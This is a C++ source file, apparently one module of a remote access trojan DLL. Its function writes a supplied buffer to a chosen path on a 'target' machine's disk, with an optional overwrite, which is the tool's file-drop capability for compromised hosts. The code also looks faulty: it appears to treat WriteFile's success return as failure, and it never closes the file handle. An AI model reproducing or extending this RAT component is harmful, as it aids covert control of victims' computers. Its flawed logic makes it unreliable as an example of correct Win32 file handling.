// Patrick Sacchet
// Verison 1.0.
// RAT-Dll-PutFile.cpp : Defines functionality for performing a file put on target, i.e., placing a buffer with contents at a specified location on target disk

#include "RAT-Dll-Connect.h"
#include "RAT-Dll-PutFile.h"

/** This funciton will perform a simple put file for us 
params:
 * filePath - path to the file we're putting 
 * fileBytes - bytes we're writing to our file 
 * overwrite - whether or not to overwrite the file if its already there
return:
 * if successfulk we return SUCCESS; otherwise print the error code and handle appropiately 
*/
INT performPutFile(__in const char* filePath, __in const char* fileBytes, __in bool overwrite)
{
	INT status = SUCCESS;
	DWORD bytesWritten = 0, bytesToWrite = strlen(fileBytes);
	CHAR msgBuf[DEFAULT_BUF_LEN];
	HANDLE hFile;

	if (overwrite)
	{
		OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Overwriting existing file!\n");

		hFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Failure from CreateFileA (INVALID_HANDLE_VALUE)\n");
			status = FAILURE;
			goto cleanup;
		}
	}

	else
	{
		OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Attempting to create new file...\n");

		hFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Failure from CreateFileA (INVALID_HANDLE_VALUE)\n");
			status = FAILURE;
			goto cleanup;
		}
	}

	status = WriteFile(hFile, fileBytes, bytesToWrite, &bytesWritten, NULL);
	if (status != SUCCESS)
	{
		OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Failure from WriteFile!\n");
		status = FAILURE;
		goto cleanup;
	}

	if (bytesWritten != bytesToWrite)
	{
		OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Failed to write total byte buffer!\n");
		status = FAILURE;
		goto cleanup;
	}


	sprintf_s(msgBuf, "RAT-Dll-PutFile::performPutFile - Wrote %i bytes to %s !\n", bytesWritten, filePath);


cleanup:
	return status;
}